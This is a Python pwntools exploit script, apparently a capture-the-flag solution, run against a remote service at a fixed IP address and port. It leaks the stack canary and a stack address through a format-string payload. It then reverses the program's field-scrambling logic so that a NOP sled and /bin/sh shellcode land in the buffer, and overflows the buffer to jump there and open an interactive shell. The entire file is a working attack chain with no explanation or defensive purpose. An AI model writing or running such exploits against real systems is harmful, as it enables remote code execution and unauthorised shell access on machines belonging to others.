from pwn import *

context.log_level = "debug"
p = remote('34.76.206.46', 10003)
elf = ELF("./data", checksec=False)
context.binary = elf

fmt_payload = b"%77$p%1$p"

p.sendafter(b"Are you sure that", fmt_payload)

p.recvuntil(b"You entered:")
leak = p.recvuntil(b"Is that correct?").replace(b"Is that correct?", b"").strip()

delim = leak.find(b"0x", 3)
addr1 = leak[:delim]
addr2 = leak[delim:]

leak1 = int(addr1, 16)  # canary
leak2 = int(addr2, 16)  # stack addr

canary = p64(leak1)

buffer_start = leak2 - 0x7ffe37197ea0 + 0x7ffe37199ff0

p.sendline(b"yes")
p.recvuntil(b"Enter your Name")

nums = p.recvuntil(b"(in this order):")
left = -1
right = left

# obtain values from stdin
values = [0, 0, 0, 0, 0]
for idx in range(5):
    left = nums.find(b"(", left+1)
    right = nums.find(b")", left)
    values[idx] = int(nums[left+1:right].decode("ascii"))

n = values[0]
an = values[1]
b = values[2]
u = values[3]
a = values[4]

def str_to_field(buf, plus, sz, len_done, field_len):
    buf[plus:plus+field_len] = sz[len_done:len_done+field_len]

def scramble(name, admno, branch, university, address):
    fields_buffer = [-1] * 0x200

    str_to_field(fields_buffer, 0, name, 0, n // 2)
    sum = n // 2
    str_to_field(fields_buffer, sum, branch, 0, b // 3)
    sum += b // 3
    str_to_field(fields_buffer, sum, admno, 0, an // 3)
    sum += an // 3
    str_to_field(fields_buffer, sum, university, 0, u // 2)
    sum += u // 2
    str_to_field(fields_buffer, sum, address, 0, a // 10)
    sum += a // 10
    str_to_field(fields_buffer, sum, branch, b // 3, b - b // 3)
    sum += b - b // 3
    str_to_field(fields_buffer, sum, name, n // 2, n - n // 2)
    sum += n - n // 2
    str_to_field(fields_buffer, sum, address, a // 10, a // 10)
    sum += a // 10
    uVar1 = u
    if u < 0:
        uVar1 = u + 3

    str_to_field(fields_buffer, sum, university, u // 2, uVar1 >> 2)
    uVar1 = u
    if u < 0:
        uVar1 = u + 3

    sum += uVar1 >> 2

    str_to_field(fields_buffer, sum, admno, an // 3, an - an // 3)
    sum += an - an // 3
    str_to_field(fields_buffer, sum, address, a // 10 + a // 10,
                a + (-(a // 10) - a // 10))

    uVar1 = u
    if u < 0:
        uVar1 = u + 3

    uVar2 = u
    if u < 0:
        uVar2 = u + 3

    str_to_field(fields_buffer, (sum + a + (-(a // 10) - a // 10)), university, (uVar2 >> 2) + u // 2, u - ((uVar1 >> 2) + u // 2))

    # print(fields_buffer)
    return fields_buffer


def generate(desired_text):
    test_name = [x for x in range(n)]
    test_admno = [x for x in range(n, n+an)]
    test_branch = [x for x in range(n+an, n+an+b)]
    test_university = [x for x in range(n+an+b, n+an+b+u)]
    test_address = [x for x in range(n+an+b+u, n+an+b+u+a)]
    # these 5 lists will give a unique set of indices that we can map back later

    rearranged_buffer = scramble(test_name, test_admno, test_branch, test_university, test_address)
    # this buffer is a list of numbers that we can reverse to get a descrambled string

    actual_name = [b"A"] * n
    actual_admno = [b"A"] * an
    actual_branch = [b"A"] * b
    actual_university = [b"A"] * u
    actual_address = [b"A"] * a

    for idx, desired_char in enumerate(desired_text):
        original_idx = rearranged_buffer[idx]

        desired_char = desired_char.to_bytes(1, "little")

        # finding the mapping from our original indices
        if original_idx in test_name:
            pos = test_name.index(original_idx)
            actual_name[pos] = desired_char

        elif original_idx in test_admno:
            pos = test_admno.index(original_idx)
            actual_admno[pos] = desired_char

        elif original_idx in test_branch:
            pos = test_branch.index(original_idx)
            actual_branch[pos] = desired_char

        elif original_idx in test_university:
            pos = test_university.index(original_idx)
            actual_university[pos] = desired_char

        elif original_idx in test_address:
            pos = test_address.index(original_idx)
            actual_address[pos] = desired_char

    return (b"".join(actual_name), b"".join(actual_admno), b"".join(actual_branch), b"".join(actual_university), b"".join(actual_address))

nops = 420
sh = asm(shellcraft.sh())
shellcode = b"\x90" * nops + sh
name, admno, branch, university, address = generate(shellcode)

pload = name + admno + branch + university + address  # of length 512

spam = 7  # -10 - 6

length = cyclic(0x40).find(b"caaadaaa")
rop_payload = pload + b"A" * (520-512) + canary + b"B" * length + p64(buffer_start + (nops//2 * spam))

p.sendline(rop_payload)

p.interactive()